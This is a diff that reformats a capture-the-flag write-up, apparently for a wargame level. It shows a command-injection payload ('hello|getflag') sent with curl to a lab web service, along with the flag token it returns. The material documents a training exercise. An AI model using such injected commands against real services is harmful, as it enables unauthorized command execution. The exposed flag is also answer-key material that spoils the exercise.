@@ -17,14 +17,16 @@ It execute the the command echo with our parameter
 
 If we curl into localhost:4747/?x=hello we get hello back
 
-`[~]$ curl http://10.12.177.116:4747/\?x\=hello`
+```
+[~]$ curl http://10.12.177.116:4747/\?x\=hello
 hello
-`[~]$`
+[~]$
+```
 
 Now Let's try and inject the getflag command into the x query parameter and see if we can get the flag
 
-`[~]$ curl http://10.12.177.116:4747/\?x\=hello\|getflag`
-
-# Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
-
-`[~]$`
+```
+[~]$ curl http://10.12.177.116:4747/\?x\=hello\|getflag
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+[~]$
+```
